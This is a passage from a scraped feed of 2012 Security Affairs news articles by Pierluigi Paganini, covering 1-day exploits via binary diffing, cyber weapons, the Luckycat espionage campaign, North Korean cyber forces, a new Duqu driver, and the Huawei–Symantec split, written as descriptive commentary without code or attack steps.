manner are compared binary of a system before and after the patch is applied.\n\nThis binary diffing technique are particulary efficient against Microsoft\u2019s binaries because the company releases patchs regularly and inside the patch code quite simple to identify the code that patch the vulnerability usually concentrated in small portion of the binary code.\nToday an attackers have access to a huge quantity of tools to identify unknown vulnerabilities just patched, they only need to launch the attacks during the time frame users or corporates are applying patches.\n\nDuring patch applying time frame, the end users are more vulnerable and targeted using 1-day attack. Most famous frameworks for Binary diffing are DarunGrim2 and Patchdiff2.\n\nIn the reality the process of reverse engineering of a patch is more complicated because each vendors use different compilers and optimization methods. Remember the case of the mystery related to the source code of malware Duqu \u2026 it was even difficult to understand the programming language used because the developers had adopted a compilation with special options.\n\nThe 1-day exploit are real threats that happening every patch days. Sometimes some people diff different version of product, finding in their binaries vulnerabilities fixed silently . So as the attacking technology improves, the protection techniques need to evolve accordingly, we already have several anti diffing tools like \u201cHondon\u201d but is also necessary that the major vendors will adopt strongest solution for the patching of their products.\n\nIn the meantime the only guaranteed defense against the 1-day attack is to patch our system before the criminal exploits.\n\nPierluigi Paganini\n\nhttp://www.blackhat.com/presentations/bh-usa-09/OH/BHUSA09-Oh-DiffingBinaries-PAPER.pdf\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/0-day", "topic_name": "0-day"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/1-day-exploits", "topic_name": "1-day exploits"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/exploit", "topic_name": "exploit"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/reverse-engineerig", "topic_name": "reverse engineerig"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/vulnerabilities", "topic_name": "vulnerabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-day-exploits", "topic_name": "Zero-Day Exploits"}]}, {"news_name": "Cyber Weapons", "news_link": "https://securityaffairs.co/wordpress/3896/intelligence/cyber-weapons.html", "title": "Cyber Weapons\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 3, 2012", "body": "Article Published on The Hacker New Magazine \u2013 April Edition \u201cCyber_Warfare\u201d\n\nFirst let\u2019s try to provide a definition of cyber-weapon, to do this I get inspiration from an article written by experts Thomas Rid and Peter McBurney. Correctly define cyber weapon has significant legal and political consequences as well as the security itself. The line between what is a cyber-weapon and what is not a cyber-weapon is subtle.\n\nBut drawing this line is important. For one, it has security consequences: if a tool has no potential to be used as a weapon and to do harm to one or many, it is simply less dangerous.\n\nSecondly, drawing this line has political consequences: an unarmed intrusion is politically less explosive than an armed one. Thirdly, the line has legal consequences: identifying something as a weapon means, at least in principle, that it may be outlawed and its development, possession, or use may be punishable.\n\nIt follows that the line between weapon and non-weapon is conceptually significant: identifying something as not a weapon is an important first step towards properly understanding the problem at hand and to developing appropriate responses. The most common and probably the most costly form of cyber-attack aims to spy.\n\nThe two expert define \u201ccyber weapon\u201d as \u201ca computer code that is used, or designed to be used, with the aim of threatening or causing physical, functional, or mental harm to structures, systems, or living beings\u201c\n\nOver the years many cyber weapons have been identified, without a doubt the most famous of which is the virus Stuxnet, and this has led to introduce many different classification for their qualifications.\n\nAn interesting classification of cyber weapons is based on spectrum of action, in this scale we introduce the following categories:\n\nCost and complexity of this cyber threats are related to the category the belong, consider also that behind high potential agents there is a long and considerable content of intelligence used to acquire information on final target and develop the weapon specific for it.\n\nIn recent years one of the topics of greatest interest in the international scientific community has been the development of new cyber weapons to use against hostile countries.\nWhat dominates, without any doubt, was the use of viruses and other malware to attack critical infrastructure of the opponents.\nThe Stuxnet case did school, for sure behind its development there are government structures, most likely in the U.S. and Israel.\n\nWhy the use of a cyber weapon has proved a winner?\n\nTo understand the real evolution of cyber weapons will propose again taken from a slide part of the presentation \u201cPreparing for a Cyber \u200b\u200bAttack\u201d by Kevin G. Coleman.\n\n\n\nEasy to understand how is grown over the years the technology in the development of a cyber arsenal and how dangerous are the cyber weapons of the next future.\n\nBut what are the objectives to be attacked with weapons of this kind?\nThe series is very wide, it is known that through a malware can affect any system in which there is a control component. To cite some examples:\n\nSeveral intelligence studies demonstrate that more over 140 countries have a cyber weapon development program, starting from 2006 the the equity investment is a hundred times higher, with a sensible increase in the number of countries that are pursuing this kind of weapon or acquiring knowledge in the sector.\n\n THE cyber weapon is a unique prerogative of governments?\n\nUnfortunately not, although behind the development of a cyber weapon there is a painstaking intelligence work and investment still large, we must keep in mind that such weapons can also be developed by groups of criminal and hacktivist with unpredictable and disastrous. As anticipated the development of a cyber weapon requires a long process of research, however, groups of hackers and cyber criminals may be able, through processes of reverse engineering, to analyze the sources code of existing weapons modifying it according their design. In this way could proliferate cyber weapons characterized by increasingly complexity and unpredictable behavior.\n\nLet\u2019s clarify that a cyber weapon not necessary must be used with offensive purpose, during last months a news has been circulating in some media about the Fujitsu company has subscribed a contract with the Japanese Ministry of Defense developed for a development of a new virus.\nThe news confirms therefore the approach introduced in this article, viruses are used as a weapon inside a cyber strategy. I cite this example to the uniqueness of the case. This time the project for the virus development should not be but for the offense purpose but for defense. That is another interesting usage of a cyber weapon, developed to defend systems and track back any cyber threats.\n\nRegarding the project, for an approximate cost of U.S. $ 2.3 million, appears that Japan is keen to have a tool that seeks out infected computers, hopping from PC to PC, and cleans them up.\nThe debate on the efficacy of the method adopted is open.\n\nAre we ready to face a cyber attack?\n\nNo doubt in recent years, international opinion was strongly sensitized on this issue and there have been huge investments in warfare. Numerous studies have demonstrated the need for adequate cyber strategy, defensive as offensive. Unfortunately the news is not good, too many critical infrastructures are still vulnerabilities to attacks carried out with this type of weapon, it is therefore necessary to monitor, with an international collaboration, the development and proliferation of these threats. The key critical infrastructures all over the world must be identified and must be defined a common defense policy \u2026 we still have much work to do.\n\nAbout the Author : Pierluigi Paganini, Security Specialist\n\nCEH \u2013 Certified Ethical Hacker, EC Council\n\nSecurity Affairs ( http://securityaffairs.co/wordpress  )\n\nEmail : pierluigi.paganini@securityaffairs.co\n\nReferences\n\nhttp://www.tandfonline.com/doi/abs/10.1080/03071847.2012.664354\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident", "topic_name": "Incident"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "Chinese hackers & Operation \u201cLuckycat\u201d against Japan, Tibet and India", "news_link": "https://securityaffairs.co/wordpress/3845/hacking/chinese-hackers-operation-luckycat-against-japan-tibet-and-india.html", "title": "Chinese hackers & Operation \u201cLuckycat\u201d against Japan, Tibet and India\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 2, 2012", "body": "Recently have been detected several targeted attacks against Tibetan activist organizations including the International Campaign for Tibet and the Central Tibet Administration. Immediately suspicions have focused on China and on groups of hackers sponsored by the Beijing government, more than one occasion we have shown how the Chinese government also promotes and supports from economic point of view these initiatives.\n\nThe experts of the AlienVault Lab have hypothesized that the group of Chinese hackers was the same responsible of the attacks against chemical and defense companies late last year in an operation named \u2018Nitro\u2019.\n\nThe attacks carried out using a tested scheme starting with a spear phishing campaign that uses an infected Microsoft Office file to exploit a known vulnerability in Microsoft. As usually the content of the email refer a topic of interest for the final target, in this case related to the Kalachakra Initiation, a Tibetan religious festival that took place in early January. The vulnerability that has exploited is known Office stack overflow vulnerability (CVE-2010-3333).\n\nThe malware used is a variant of Gh0st RAT, a well know remote access Trojan, that enables to acquire the total control of the target allowing documents theft and cyber espionage. Gh0st RAT was the tool also used in the Nitro attacks and the instance isolated in the last attacks against Tibet is correlated to it, the intent this time is to infiltrate organizations for political reasons.\n\nFor the precision have been identified five families of malware, free Web hosting services for their command and control machines and also a malware called TROJ_WIMMIE. This malware exploited Rich Text Format Stack Buffer Overflow Vulnerability (CVE-2010-3333) and also Adobe Reader and Flash Player vulnerabilities.\n\nDon\u2019t forget that Chinese Government has always done an oppressive policy against the nation, in April of 2008 protests erupted hard in some cities in Tibet that have been repressed by the government in Beijing with the use of force.  During last years have been detected in numerous cases of violations of human dignity in Tibet by the Chinese government. According to the Dalai Lama in Tibet we are assisting to cultural genocide.\n\nTrend Micro, the famous security firm, has released a research paper that demonstrate the relationship between attacks against the computers of Tibetan activists and companies in Japan and India and the activities performed by group of Chinese hackers.\n\nThe operations are known as part of the \u201cLuckycat\u201d cyber campaign began around June 2011, more over 90 attacks against targets in India, Japan and Tibetan activists.\n\nLast week on the New York Times has been published an article that announced that the responsible of the attacks has been identified, he is a Chinese former graduate student who seem to work for Tencent, China\u2019s leading Internet portal company.\n\nThe hacker is named Gu Kaiyuan, once a graduate student at a Chinese university he receives government financial support for its computer security program and currently an employee at Chinese portal Tencent. Kaiyuan was involved in recruiting students for his school\u2019s computer security and defense research.\n\nTrend Micro researchers have also found that the group attacked also military research institutes and aerospace, energy, engineering, and shipping companies.\n\nThe Trend Micro researchers, led by Nart Villeneuve, traced the hacks to an e-mail address used to register one of the command and control servers the malware accessed. That e-mail address was then found to map to a Chinese instant messaging account belonging to a Chinese hacker, \u201c\u201cdang0102.\u201d\n\n\n\n\nA reconstruction made by Trend Micro\u2019s experts revealed that in 2005 the hacker was already operating as a recruiter:\n\n\u201cThe same hacker also published a post on a student BBS of the Sichuan University using the nickname, \u201cscuhkr,\u201d in 2005,\u201d the report stated. \u201cHe wanted to recruit 2-4 students to a network attack and defense research project at the Information Security Institute of the Sichuan University then. Scuhkr also authored articles related to backdoors and shellcode in a hacking magazine that same year.\u201d\n\nOf course this the involvement of Gu Kaiyuan doesn\u2019t prove the campaigns are officially sponsored by the Chinese government but the target choosen let the expert believe that behind the hacker there is the Bejing government. The former diplomat James A. Lewis, actual director at the Center for Strategic and International Studies in Washington, declared on the events:\n\nBut \u201c(t)he fact they targeted Tibetan activists is a strong indicator of official Chinese government involvement,\u201d\n\nthe Times quotes. \u201cA private Chinese hacker may go after economic data but not a political organization.\u201d .\n\nPersonally, I\u2019m sure of the involvement of the Chinese Government for the nature of the targets attacked and the way in which the attacks were carried out. The involvement of young hackers is now known practice of aggressive cyber strategy of China, which has long invested in youth resources involving them in cyber espionage and hacking \u200b\u200bactivities.\n\nTo conclude the event in question I remark that this is just the tip of the iceberg, similar  \u200b\u200bactivities are conducted daily by cyber militia in China and very often due the nature of attacks are involved young professionals in the IT sector \u2026 probably we have to learn by this approach.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/india", "topic_name": "India"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/japan", "topic_name": "Japan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/luckycat", "topic_name": "Luckycat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/phishing", "topic_name": "phishing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tibet", "topic_name": "Tibet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}]}, {"news_name": "North Korea scares the West", "news_link": "https://securityaffairs.co/wordpress/3748/intelligence/north-korea-scares-the-west.html", "title": "North Korea scares the West\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 30, 2012", "body": "According to US official declarations North Korea has added new sophisticated cyber weapons to its arsenal, the event causes much concern in political and military. The dialogue between Western governments, and particularly the U.S, with the government in Pyongyang continues to be difficult, complicating the situation is the defiant attitude adopted by the North Korean government that intends to make a series of military exercises next month, testing and launching new missiles. North Korea has declared that the rocket to be launched to mark the 100th birthday of deceased state founder Kim Il-sung and will be used to putting a weather satellite into orbit  Security experts are convinced that it will be an opportunity to test long-range missile for this reason Security Council resolutions ban any these launches.\n\n\u201cThis planned launch is highly provocative because it manifests North Korea\u2019s desire to test and expand its long-range missile capability,\u201d said Lavoy.\n\nThe launch also violates a missile moratorium that Pyongyang government signed to on Feb. 29 with the US in exchange for food aid. The North Korea is progressing with the development of announced military strategy, according to report of American intelligence, the area used for the exercises will be near the border with China, in the northwestern of the country. North Korea\u2019s neighbors are concerned about the launch of a rocket that will fly over Philippines or Indonesia and there is no confidence regarding the stability of the missile. The Web site GlobalSecurity.org published satellite imagery last week of a launch pad and tower without a rocket at the Tongchang-dong launch site.\n\n\n\n\n\n \n\nLet\u2019s make some simple consideration on the geography of the region. The principal enemy for North Korea is the South Korea, that\u2019s why it has deployed most of its forces in the demilitarized bordering zone. More than half of South Korea\u2019s population lives in the vicinity of its capital Seoul, a possible missile attack toward the city would lead the nation into a panic. A similar effect can also be obtained with a cyber warfare operation against critical infrastructures in the country. The North Korea is aware of this opportunity and it is approaching all the major options. Obviously, the computer option may have already been initiated and be operating in silent that really frightens the government of South. Banks, Telecommunication networks, industries, but also intelligence agencies may already have been unwitting victims of cyber attacks.\n\nLet consider that North Korea has the highest percentage of military personnel in relation to population than any other nation in the world, with approximately 40 enlisted soldiers per 1000 people with a considerable impact on the budge of the country.  Don\u2019t forget also that North Korea has capabilities that also include chemical and biological weapons.  A defector has declared that North Korea has increased its cyber warfare unit to staff 3,000 people and it is massive training its young prodigies to become professional hackers.\n\nIntelligence sources in South Korea believe that the Nation has a large a cyber force that responds to the command of the country\u2019s top intelligence agency, the General Reconnaissance Bureau.\n\nThe Reconnaissance Bureau of the General Staff Department is responsible for collecting strategic, operational, and tactical intelligence for the Ministry of the People\u2019s Armed Forces, and this special unit is responsible for the cyber attacks conducted in the last years against foreign countries like South Korea.\nThe US military officials have reported to the House of Representatives Armed Services Committee that North Korea has a large conventional military, has developed a worrying nuclear weapons programs, acquiring new capabilities in ballistic missiles sector and improving cyber warfare techniques.\n\nAccording to the revelation of Army General James Thurman, the commander of US Forces Korea, the government of Pyongyang is massively investing in cyber warfare capabilities, recruiting and forming a high skilled team of hackers. The groups will be engaged in offensive cyber operations against a hostile government and in cyber espionage activities.\n\nThe central government reserves for young hackers several incentives providing best tools on the market and providing living conditions for them and their families extremely advantageous. The importance assigned to the professional development of new cyber military is indicative of the perception of how the cyber warfare is strategic for the nation.\n\nThe death of the leader Kim Jong in December seems hasn\u2019t any effect on the politics of the country, contrary to the wishes the relations and cooperation with China have been strengthened. The China\u2019s support is the main concern due to the known capabilities of cyber units and its aggressive cyber strategy.\n\nLooking the list of IXP (Physical Infrastructures through which Internet service providers (ISPs) exchange Internet traffic between their networks (autonomous systems)) we can observe the absence of North Korea so how the country access to internet?\n\nThrough China of course!\n\nIt is difficult to be a real cyber army without a direct pipe to the web. Evidence of Chinese collaboration has been collected with many analysis tracing back the cyber attacks to source addresses. Well regarding several attacks there were no attempts to hide their origin. Mainly there are two blocks of IP addresses that can be identified as North Korean but owned by China Netcom, one of China\u2019s largest Internet service providers, but they are assigned to the Korea Posts and Telecommunications Co., the government-run telco.\n\nA further element of concern is represented by the next elections to be held in South Korea, in April and December because North Korea can try to disturb and influence its regular course and outcome. The moment will be really critic and the risks are really high.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 North Korea, Information Warfare)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "Duqu \u2013 Cyber weapons factory still operating \u2026  it\u2019s just the beginning", "news_link": "https://securityaffairs.co/wordpress/3716/malware/duqu-cyber-weapons-factory-still-operating-its-just-the-beginning.html", "title": "Duqu \u2013 Cyber weapons factory still operating \u2026  it\u2019s just the beginning\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 29, 2012", "body": "We all remember the decision of the western states to prohibit the sale of anti-virus systems to Tehran, penalties determined to thwart the development of Iran\u2019s nuclear program. A predictable decision that haven\u2019t created any problem the state that seems has developed a new antivirus program to immunize the systems from the notorious Stuxnet virus.\nThe security application will be distribute for free during the next weeks, some experts even believe that some instances of malware can still be present in the systems of the nuclear site of Natanz in Iran.\n\nIf Stuxnet seem to be beaten, actually the main concerns are related to all the malware derived from it that have been developed using same platforms and techniques. Extremely important the conception of the virus as an open project, a modular system for which it was designed a development platform used to assemble the deadly cyber weapons in relation to the final targets in fact  it has been discovered a platform behind Stuxnet called \u201cTilded Platform\u201c, used also for the development of Duqu malware, and that make possible the development of a set of reusable tools. It\u2019s a true innovation that make possible the composition of ever new and enhanced agents with modules developed to fulfill specific functions against clearly defined targets.\n\nDuqu is quite different from its relative, it has a modular structure like Stuxnet but it isn\u2019t equipped with modules for SCADA systems attack. It is only able to steal information from the host system. Experts suppose that a team of specialists with high technical skills has been engaged to project this innovative cyber weapons.\n\nThe last sightings of malware Duqu date back to last year, when its creators have tried to delete any evidence of their operations deleting all the information on the servers used in the past years.\n\nDuring last weeks a new instance of Duqu has been isolated in a variant designed to evade detection mechanism of antivirus products and other security systems. Vikram Thakur, principal security response manager at Symantec, announced that the new Duqu Driver has been identified, let\u2019s remind that the module is used for loading the malware\u2019s encrypted body stored on the systems. The driver is called mcd9x86.sys and it was compiled on Feb. 23.\n\nThe source code appears to be reshuffled and compiled with a different set of options and it also contains a different subroutine for decrypting the configuration block and loading the malware\u2019s body. A similar operation has been already observed in October 2011. Of course also the references to C&C server are changed because all old structures were shut down on Oct. 20, 2011.\n\nUnfortunately the addresses of this server are not known because principal security firm don\u2019t have the full Duqu body but only the loader in the form of the driver, the loader does not contact the C&C directly, it only loads the main body which is stored in encrypted form.\nThere were virtually no traces of Duqu since then. But several days ago Symantec\u2019s researchers announced that they found a new \u201cin-the-wild\u201d driver that is very similar to known Duqu drivers. Previous modifications of Duqu drivers were compiled on Nov 3 2010 and Oct 17 2011, and the new driver was compiled on Feb 23 2012.\n\nThe fact that the new driver was found in Iran confirms that behind the development of the malware there are governments interested to disturb the nulear program of the country.\n\nAccording Symantec, the number of incidents related to Duqu is at least of 21, most of them located in Iran. One of the main problem in the analysis of the agent is that the majority of the infected machines did not contain main Duqu modules but only the files created by these compnents, with names starting with \u201c~DQ\u201d, \u201c~DF\u201d, \u201c~DO\u201d.\n\nPurpose of the agent was gathering information related to control systems used in different industries in Iran, and for information about trade relationships of particular organizations.\nVery interesting is the list of known modifications of Duqu provided by Alexander Gostev, expert of the Kaspersky Lab.\n\nThe following table contains information about all the components of Duqu we know about. The files marked with green are known. The files marked with red are missing; they were not found on infected machines, however, we know the names and sizes of some of the missing files indirectly.\n\n\n\n \n\nFor exercise I tried to graph the data supplied by leading teams involved in research on malware, the fact that the majority of instances has been identified in Sudan and Iran will you suggest something? Have you still doubts about who may have developed the powerful family of cyber weapons?\n\n\n\n \n\nAccording Gostev the Duqu driver was probably modified to avoid detection of security software and of other applications able to discover the agent like the open-source Duqu Detection Toolkit. The tool have been developed by the Laboratory of Cryptography and System Security (CrySys) in Budapest and updated just two weeks ago.\n\nForensic stand-alone tools such as the one CrySys developed are fundamental for the analysis of Duqu malware because it can give a precious series of data related to the infection of the victim system and on the mode used during the attack like the identification of the data stolen from the computer stored in files ending in \u201cDQ\u201d and in \u201cDF.\u201d\n\nCostin Raiu, director of the global research and analysis team for Kaspersky Lab has declared:\n\n\u201cThe toolkit released by CrySys Lab is top class,\u201d\n\n\u201cOf course, all of this can be done \u2018manually,\u2019 but these tools make it much easier to spot anomalies in Duqu-infected computers.\u201d\n\nThere are 7 different versions of the main Duqu module (PNF DLL) in the list set up to interact with five 1st tier C&C servers that have been shut down by Kaspersky Lab and Symantec, really interesting is the effort spent in encryption and obfuscation techniques that prove the will of the creators of the malware to conduct an undercover operation, typical advantage of the adoption of cyber weapons.\n\nWhat we expect from the future?\n\nThe authors of Duqu are back after a 4 months of silent and this confirm that malware such as Stuxnet and Duqu are children of an ambitious and complex project that wants to be able to provide an \u201cevolutionary\u201d threat. Prepare to have to deal with new modules and new features designed to attack specific targets.\n\nIn a my previous article on the topic I wrote:\n\nLet me raise serious doubts on the immediate effectiveness of preventive measures against this new generation of cyber weapons because the industry in general is still too vulnerable. Possible evolutions of malware could cause serious damage to infrastructures that use the systems in question.\nThe only way to emerge unscathed from this awkward situation is a close collaboration between industry, producers of control systems and governments, hoping that security will become a requirement in the design phase.\n\nNothing is yet changed! On the malware development have been invested much money and consequence of this is that the operations will continue for a long time.\n\nWe will assist to the born of new version of the existing agents equipped with more sophisticated modules that include new features and that are also able to avoid antivirus detection. we will face with also the development of new malware based on the same platform.\n\nLet us prepare for the worst \u2026 errors are not allowed!\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivist", "topic_name": "hacktivist"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident", "topic_name": "Incident"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tilded-platform", "topic_name": "Tilded Platform"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "Huawei \u2013 Symantec, broken join venture and the fear on chinese firms", "news_link": "https://securityaffairs.co/wordpress/3666/intelligence/huawei-symantec-broken-join-venture-and-the-fear-on-chinese-firms.html", "title": "Huawei \u2013 Symantec, broken join venture and the fear on chinese firms\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 27, 2012", "body": "It\u2019s official, the joint venture between Symantec and Huawei Technologies is ended because the American IT security firms feared that the collaboration with the Chinese telecommunications producer could have a sensible impact on its business. In particular the US Government could not give to Symantec access to its classified information cyber threats. The joint venture, called Huawei \u2013 Symantec Technologies, was established in 2007 with the purpose to develop and distribute security appliances to telecommunications carriers. Symantec would sell its quote of 49% to Huawei for US$530 million.\n\n\n\nSymantec CEO and President Enrique Salem has declared:\n\n\u201cSymantec achieved the objectives we set four years ago and exit the joint venture with a good return on our investment, increased penetration into China, and a growing appliance business.\u201d\n\nConfronted with 10 million cyber attacks per day, the U.S. Defense Department is changing its approach to the problem, placing greater emphasis on its relations to those which are the main providers of services and equipment.\n\nGroups of cyber criminals are aware of the huge demand for information about military sectors, for this reason they continuously try to acquire and sell information about each country\u2019s militia and intelligence agencies through several techniques, espionage, phishing, extortions, cyber attacks, hacking of major government contractors.\n\nThe risks are really serious, this information could be used by hostile government in cyber attacks and cyber espionage activities in the short term. While, on the domestic front the US Government, aware of its vulnerability, is moving defining and implementing cyber strategies aimed at strengthening its systems, the events of recent months have shown that relationships with contractors are the weakest link in the chain safety. The contractors with governmental exchange sensitive information and therefore it is expected that the government seeks assurances regarding arrangements employed in the management of information.\n\nThe decision of the U.S. Is shared and is in line with the stringent requirements of Government on cyber security.\n\nThe Cyber espionage is one of the most common forms of cybercrime in this period of great concern to the world of private industry and military, a growing number of companies are victims of computer attacks with purposes of cyber espionage to steal corporate secrets and intellectual property with the intent to benefit in economic terms.\n\nThe information acquired may in fact be resold by criminals to competitor companies and governments interested to the strategic know-how. The line between cyber crime and cyber warfare is thin, we have understood that one of the main strategies pursued by governments around the world is to make intelligence operations through technology to gather sensitive information relating to private industry and military sectors that somehow represent the backbone of the nation victims of attacks.\n\nThe cyber espionage is a terrible cyber threat can have devastating effects on the social fabric of a nation as well as on the actions of every private company, is sneaky and silent, and for this reason, unlike other crimes may be conducted for years without the victim being aware of it with serious consequences, as happened in the case of Notartel company.\n\nThe biggest threat in term of cyber-espionage against American business are China and Russia engaged in efforts to obtain sensitive business and technology information as well. The report projects that China and Russia will \u201cremain aggressive and capable collectors of sensitive US economic information and technologies, particularly in cyberspace.\u201d\n\nThe New York Times reported on Monday that Symantec\u2019s decision came as a political move to coincide with the US government\u2019s efforts in the 